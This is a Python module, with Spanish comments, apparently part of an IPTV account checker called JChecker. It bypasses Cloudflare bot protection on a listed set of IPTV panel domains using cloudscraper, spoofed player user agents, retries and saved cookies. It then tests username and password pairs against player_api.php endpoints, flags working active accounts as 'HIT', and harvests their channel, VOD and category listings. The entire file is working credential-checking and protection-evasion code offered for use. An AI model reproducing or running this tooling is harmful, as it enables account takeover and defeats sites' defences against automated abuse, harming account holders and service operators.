#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cloudflare Bypass MEJORADO v2.0 - JChecker v5.7
Soporta dominios con protección estricta como venuspv.me
"""

import time
import random
import logging
import pickle
import os
from pathlib import Path

logger = logging.getLogger()

# Lista de dominios protegidos
CLOUDFLARE_PROTECTED_DOMAINS = [
    'star-flix.net',
    'mylatinotvmoon.com',
    'venuspv.me',
    'mytitantv.com',
    'mymoontools.xyz',
    'moonstalker.xyz',
    'moontools.me',
    'moonxtream.com',
    'titanxtv.com',
    'venusiptv.com'
]

# Dominios con protección EXTRA estricta
EXTRA_STRICT_DOMAINS = [
    'venuspv.me',
    'venusiptv.com',
    'moontools.me'
]

# User-Agents de reproductores IPTV REALES
IPTV_USER_AGENTS = [
    'VLC/3.0.16 LibVLC/3.0.16',
    'VLC/3.0.18 LibVLC/3.0.18',
    'Kodi/19.4 (Windows NT 10.0; Win64; x64) Kodi/19.4',
    'Kodi/20.0 (Android 11; Mobile)',
    'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
    'PerfectPlayer/1.5.8 (Linux; Android 9)',
    'GSE SMART IPTV/7.4 (Android 11)',
    'IPTV Smarters Pro/3.0.9.4 (Android 10)',
    'TiviMate/4.4.0 (Android 11)',
]

# Directorio para cookies
COOKIES_DIR = Path("cloudflare_cookies")
COOKIES_DIR.mkdir(exist_ok=True)


def is_cloudflare_protected(domain):
    """Verifica si un dominio está protegido por Cloudflare"""
    domain_clean = domain.lower().split(':')[0]
    return any(protected in domain_clean for protected in CLOUDFLARE_PROTECTED_DOMAINS)


def is_extra_strict(domain):
    """Verifica si el dominio tiene protección extra estricta"""
    domain_clean = domain.lower().split(':')[0]
    return any(strict in domain_clean for strict in EXTRA_STRICT_DOMAINS)


def get_iptv_user_agent():
    """Obtiene un User-Agent aleatorio de reproductor IPTV"""
    return random.choice(IPTV_USER_AGENTS)


def get_cookie_file(domain):
    """Obtiene la ruta del archivo de cookies para un dominio"""
    domain_clean = domain.split(':')[0].replace('.', '_')
    return COOKIES_DIR / f"{domain_clean}_cookies.pkl"


def save_cookies(session, domain):
    """Guarda las cookies de una sesión exitosa"""
    try:
        cookie_file = get_cookie_file(domain)
        with open(cookie_file, 'wb') as f:
            pickle.dump(session.cookies, f)
        logger.debug(f"🍪 Cookies guardadas para {domain}")
    except Exception as e:
        logger.debug(f"⚠️ Error guardando cookies: {e}")


def load_cookies(session, domain):
    """Carga cookies guardadas previamente"""
    try:
        cookie_file = get_cookie_file(domain)
        if cookie_file.exists():
            with open(cookie_file, 'rb') as f:
                session.cookies.update(pickle.load(f))
            logger.debug(f"🍪 Cookies cargadas para {domain}")
            return True
    except Exception as e:
        logger.debug(f"⚠️ Error cargando cookies: {e}")
    return False


def create_cloudflare_session(domain=None):
    """Crea una sesión optimizada para Cloudflare"""
    try:
        import cloudscraper
        
        # Configuración más agresiva para dominios estrictos
        if domain and is_extra_strict(domain):
            logger.info(f"🔒 Dominio con protección ESTRICTA detectado: {domain}")
            scraper = cloudscraper.create_scraper(
                browser={
                    'browser': 'chrome',
                    'platform': 'windows',
                    'mobile': False,
                    'desktop': True
                },
                delay=15,  # Delay más largo
                interpreter='nodejs'  # Usar Node.js si está disponible
            )
        else:
            scraper = cloudscraper.create_scraper(
                browser={
                    'browser': 'chrome',
                    'platform': 'windows',
                    'mobile': False
                },
                delay=10
            )
        
        # Cargar cookies guardadas si existen
        if domain:
            load_cookies(scraper, domain)
        
        logger.info("✅ Cloudscraper inicializado")
        return scraper, True
        
    except ImportError:
        logger.warning("⚠️ cloudscraper no instalado")
        import requests
        session = requests.Session()
        if domain:
            load_cookies(session, domain)
        return session, False
    except Exception as e:
        logger.error(f"❌ Error creando sesión: {e}")
        import requests
        return requests.Session(), False


def make_cloudflare_request(url, session=None, proxy=None, timeout=(15, 45), 
                            use_iptv_ua=True, retry_count=3):
    """
    Realiza petición con bypass de Cloudflare mejorado
    
    Args:
        retry_count: Número de reintentos con diferentes estrategias
    """
    from urllib.parse import urlparse
    
    # Extraer dominio
    parsed = urlparse(url)
    domain = parsed.netloc
    
    # Crear sesión si no existe
    if session is None:
        session, is_cloudscraper = create_cloudflare_session(domain)
    else:
        is_cloudscraper = 'cloudscraper' in str(type(session))
    
    # Delay extra para dominios estrictos
    if is_extra_strict(domain):
        delay = random.uniform(2.0, 4.0)
        logger.info(f"⏰ Delay de {delay:.1f}s para dominio estricto")
        time.sleep(delay)
    else:
        time.sleep(random.uniform(0.5, 1.5))
    
    # Intentar con diferentes estrategias
    for attempt in range(retry_count):
        try:
            # Rotar User-Agent en cada intento
            if attempt > 0:
                use_iptv_ua = not use_iptv_ua
            
            headers = {
                'User-Agent': get_iptv_user_agent() if use_iptv_ua else 
                             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Host': domain
            }
            
            # Headers extra para dominios estrictos
            if is_extra_strict(domain):
                headers.update({
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'Referer': f"http://{domain}/",
                    'Origin': f"http://{domain}"
                })
            
            logger.debug(f"🌙 Intento {attempt + 1}/{retry_count}")
            logger.debug(f"🌙 URL: {url}")
            logger.debug(f"🌙 UA: {headers['User-Agent'][:50]}...")
            
            # Realizar petición
            response = session.get(
                url,
                headers=headers,
                proxies=proxy,
                timeout=timeout,
                verify=False,
                allow_redirects=True
            )
            
            logger.info(f"🌙 Respuesta: {response.status_code}")
            
            # Verificar si es exitoso
            if response.status_code == 200:
                # Verificar que NO sea página de Cloudflare
                content_lower = response.text.lower()
                if not ('cloudflare' in content_lower and 'attention required' in content_lower):
                    # ¡Éxito! Guardar cookies
                    save_cookies(session, domain)
                    return response
                else:
                    logger.warning(f"⚠️ Status 200 pero es página de Cloudflare")
            
            # Si es 403, intentar con otra estrategia
            if response.status_code == 403:
                logger.warning(f"⚠️ 403 en intento {attempt + 1}")
                
                # Delay más largo antes del siguiente intento
                if attempt < retry_count - 1:
                    wait_time = random.uniform(3.0, 6.0)
                    logger.info(f"⏰ Esperando {wait_time:.1f}s antes del siguiente intento")
                    time.sleep(wait_time)
                    continue
            
            # Si no es 403 ni 200, retornar la respuesta
            if response.status_code not in [403, 503, 429]:
                return response
                
        except Exception as e:
            logger.error(f"❌ Error en intento {attempt + 1}: {e}")
            if attempt < retry_count - 1:
                time.sleep(random.uniform(2.0, 4.0))
                continue
    
    # Si llegamos aquí, todos los intentos fallaron
    logger.error("🔴 Todos los intentos de bypass fallaron")
    return None


def check_account_with_cloudflare_bypass(portal, user, password, session=None, proxy=None):
    """Verifica cuenta con bypass de Cloudflare mejorado"""
    import json
    
    # Construir URL
    if not portal.startswith(('http://', 'https://')):
        portal = f'http://{portal}'
    
    url = f"{portal}/player_api.php?username={user}&password={password}"
    
    logger.info(f"🔐 Verificando: {user} en {portal}")
    
    # Extraer dominio
    from urllib.parse import urlparse
    domain = urlparse(portal).netloc
    
    # Verificar si requiere bypass
    needs_bypass = is_cloudflare_protected(domain)
    is_strict = is_extra_strict(domain)
    
    if needs_bypass:
        logger.warning(f"⚠️ Dominio protegido por Cloudflare")
        if is_strict:
            logger.warning(f"🔒 Protección ESTRICTA detectada - usando estrategia avanzada")
    
    # Crear sesión si no existe
    if session is None:
        session, _ = create_cloudflare_session(domain)
    
    # Realizar petición con reintentos
    retry_attempts = 5 if is_strict else 3
    response = make_cloudflare_request(
        url, 
        session, 
        proxy, 
        retry_count=retry_attempts
    )
    
    if not response:
        logger.error("🔴 Sin respuesta después de todos los reintentos")
        return {
            'status': 'retry',
            'user': user,
            'pass': password,
            'error': 'cloudflare_blocked_all_attempts'
        }
    
    # Verificar respuesta
    if response.status_code == 403:
        logger.error("🔴 403 Forbidden persistente")
        return {
            'status': 'retry',
            'user': user,
            'pass': password,
            'error': 'cloudflare_403_persistent'
        }
    
    if response.status_code != 200:
        if response.status_code in [400, 401, 404]:
            return {'status': 'fail', 'user': user, 'pass': password}
        else:
            return {'status': 'retry', 'user': user, 'pass': password}
    
    # Verificar si es HTML (challenge)
    content_type = response.headers.get('content-type', '').lower()
    response_text = response.text.strip()
    
    if 'text/html' in content_type or response_text.startswith('<!DOCTYPE'):
        # Verificar si es challenge de Cloudflare
        if 'cloudflare' in response_text.lower():
            logger.error("🔴 Cloudflare challenge page")
            return {
                'status': 'retry',
                'user': user,
                'pass': password,
                'error': 'cloudflare_challenge_page'
            }
    
    # Parsear JSON
    try:
        data = json.loads(response_text)
    except json.JSONDecodeError:
        logger.error("❌ Respuesta no es JSON")
        logger.debug(f"Respuesta: {response_text[:500]}")
        return {'status': 'fail', 'user': user, 'pass': password}
    
    # Validar estructura
    if 'user_info' not in data:
        return {'status': 'fail', 'user': user, 'pass': password}
    
    user_info = data['user_info']
    auth = user_info.get('auth', 0)
    status = user_info.get('status', '')
    
    # Determinar resultado
    try:
        auth_int = int(auth)
    except:
        return {'status': 'fail', 'user': user, 'pass': password}
    
    if auth_int == 0:
        return {'status': 'fail', 'user': user, 'pass': password}
    elif auth_int == 1 and status == 'Active':
        logger.info(f"✅ HIT: {user}")
        return {
            'status': 'hit',
            'user': user,
            'pass': password,
            'data': data,
            'user_info': user_info
        }
    elif auth_int == 1:
        return {
            'status': 'custom',
            'user': user,
            'pass': password,
            'user_info': user_info
        }
    else:
        return {'status': 'fail', 'user': user, 'pass': password}


def patch_jchecker_for_cloudflare():
    """Parchea jchecker8.py para usar el bypass mejorado - SIN IMPORTAR"""
    
    print("✅ Cloudflare Bypass v2.0 cargado")
    print("🌙 Dominios soportados:")
    for domain in CLOUDFLARE_PROTECTED_DOMAINS:
        is_strict = domain in EXTRA_STRICT_DOMAINS
        strict_mark = " 🔒 [ESTRICTO]" if is_strict else ""
        print(f"   • {domain}{strict_mark}")
    
    print("\n💡 Mejoras v2.0:")
    print("   ✓ Sistema de cookies persistentes")
    print("   ✓ Múltiples reintentos inteligentes")
    print("   ✓ Detección de dominios estrictos")
    print("   ✓ Rotación automática de User-Agents")
    print("   ✓ Delays adaptativos")
    
    # NO INTENTAR PARCHEAR AQUÍ - se hará después
    return True

def get_content_with_cloudflare_bypass(portal_url, user, password, session=None, proxy=None):
    """
    Obtiene contenido (live, VOD, series) con bypass de Cloudflare
    """
    import json
    from urllib.parse import urlparse
    
    logger.info(f"🌙 Obteniendo contenido para {user} en {portal_url}")
    
    # Extraer dominio
    domain = urlparse(portal_url).netloc
    
    # Crear sesión si no existe
    if session is None:
        session, _ = create_cloudflare_session(domain)
    
    # URLs de contenido
    urls = {
        'live': f"{portal_url}/player_api.php?username={user}&password={password}&action=get_live_streams",
        'vod': f"{portal_url}/player_api.php?username={user}&password={password}&action=get_vod_streams",
        'series': f"{portal_url}/player_api.php?username={user}&password={password}&action=get_series"
    }
    
    results = {
        'envivo': '0',
        'peliculas': '0',
        'series': '0'
    }
    
    # Obtener cada tipo de contenido
    for content_type, url in urls.items():
        try:
            logger.debug(f"🌙 Solicitando {content_type}: {url}")
            
            # Delay para no saturar
            import time, random
            time.sleep(random.uniform(3, 5))
            
            response = make_cloudflare_request(
                url,
                session,
                proxy,
                timeout=(15, 45),
                retry_count=3  # Menos reintentos para contenido
            )
            
            if not response or response.status_code != 200:
                logger.warning(f"⚠️ No se pudo obtener {content_type}")
                continue
            
            # Parsear JSON
            try:
                data = json.loads(response.text)
                
                if isinstance(data, list):
                    count = len(data)
                    
                    if content_type == 'live':
                        results['envivo'] = str(count)
                    elif content_type == 'vod':
                        results['peliculas'] = str(count)
                    elif content_type == 'series':
                        results['series'] = str(count)
                    
                    logger.info(f"✅ {content_type}: {count} elementos")
                else:
                    logger.warning(f"⚠️ {content_type} no es una lista")
                    
            except json.JSONDecodeError:
                logger.error(f"❌ Error parseando {content_type}")
                continue
                
        except Exception as e:
            logger.error(f"❌ Error obteniendo {content_type}: {e}")
            continue
    
    return results['envivo'], results['peliculas'], results['series']


def get_categories_with_cloudflare_bypass(portal_url, user, password, session=None, proxy=None):
    """
    Obtiene categorías con bypass de Cloudflare
    Versión mejorada: Retorna categorías incluso si falla el conteo de canales
    """
    import json
    from urllib.parse import urlparse
    
    logger.info(f"🌙 Obteniendo categorías para {user}")
    
    # Extraer dominio
    domain = urlparse(portal_url).netloc
    
    # Crear sesión si no existe
    if session is None:
        session, _ = create_cloudflare_session(domain)
    
    # URL de categorías
    url_categorias = f"{portal_url}/player_api.php?username={user}&password={password}&action=get_live_categories"
    
    try:
        # Delay inicial
        import time, random
        time.sleep(random.uniform(2.0, 4.0))
        
        # Obtener categorías
        logger.debug(f"🌙 Solicitando categorías")
        resp_cats = make_cloudflare_request(
            url_categorias, 
            session, 
            proxy, 
            timeout=(20, 60),
            retry_count=3
        )
        
        if not resp_cats or resp_cats.status_code != 200:
            logger.warning("⚠️ No se pudieron obtener categorías")
            return ""
        
        # Parsear categorías
        try:
            categories = json.loads(resp_cats.text)
        except json.JSONDecodeError as e:
            logger.error(f"❌ Error parseando JSON de categorías: {e}")
            return ""
        
        if not isinstance(categories, list):
            logger.warning("⚠️ Categorías no es una lista")
            return ""
        
        if len(categories) == 0:
            logger.warning("⚠️ Lista de categorías vacía")
            return ""
        
        # INTENTAR obtener canales para contar (OPCIONAL - no falla si timeout)
        category_count = {}
        url_canales = f"{portal_url}/player_api.php?username={user}&password={password}&action=get_live_streams"
        
        try:
            logger.debug(f"🌙 Intentando obtener canales para conteo (puede fallar)")
            time.sleep(random.uniform(2.0, 4.0))
            
            # Timeout MÁS CORTO para no esperar mucho
            resp_channels = make_cloudflare_request(
                url_canales, 
                session, 
                proxy, 
                timeout=(15, 30),  # Timeout más corto
                retry_count=1      # Solo 1 intento
            )
            
            if resp_channels and resp_channels.status_code == 200:
                try:
                    channels = json.loads(resp_channels.text)
                    
                    if isinstance(channels, list):
                        # Contar por categoría
                        for channel in channels:
                            cat_id = channel.get("category_id")
                            if cat_id:
                                category_count[cat_id] = category_count.get(cat_id, 0) + 1
                        
                        logger.info(f"✅ Conteo de canales obtenido: {len(channels)} canales")
                    else:
                        logger.warning("⚠️ Canales no es lista, continuando sin conteo")
                except json.JSONDecodeError:
                    logger.warning("⚠️ Error parseando canales, continuando sin conteo")
            else:
                logger.warning("⚠️ No se pudieron obtener canales, continuando sin conteo")
                
        except Exception as e:
            # NO fallar por esto - continuar sin conteo
            logger.warning(f"⚠️ Error obteniendo canales para conteo: {e}")
            logger.info("📋 Retornando categorías SIN conteo de canales")
        
        # Formatear categorías (con o sin conteo)
        cate = ""
        for category in categories[:20]:  # Limitar a 20
            cat_id = category.get("category_id")
            cat_name = category.get("category_name", "").replace("\\/", "/")
            
            # Limpiar nombre
            cat_name = cat_name.strip()
            if not cat_name:
                cat_name = "Sin nombre"
            
            # Si tenemos conteo, incluirlo
            if cat_id in category_count:
                count = category_count[cat_id]
                cate += f" ➠ {cat_name} [{count}]\n"
            else:
                # Sin conteo
                cate += f" ➠ {cat_name}\n"
        
        total_cats = len(categories)
        logger.info(f"✅ Categorías obtenidas: {total_cats} (mostrando {min(20, total_cats)})")
        
        return cate.rstrip('\n')
        
    except Exception as e:
        logger.error(f"❌ Error obteniendo categorías: {e}")
        return ""


if __name__ == "__main__":
    print("🌙 Cloudflare Bypass v2.0 - JChecker v5.7")
    print("=" * 70)
    
    # Verificar cloudscraper
    try:
        import cloudscraper
        print("✅ cloudscraper instalado correctamente")
    except ImportError:
        print("⚠️ cloudscraper NO instalado")
        print("   Instala: pip install cloudscraper")
    
    print("\n" + "=" * 70)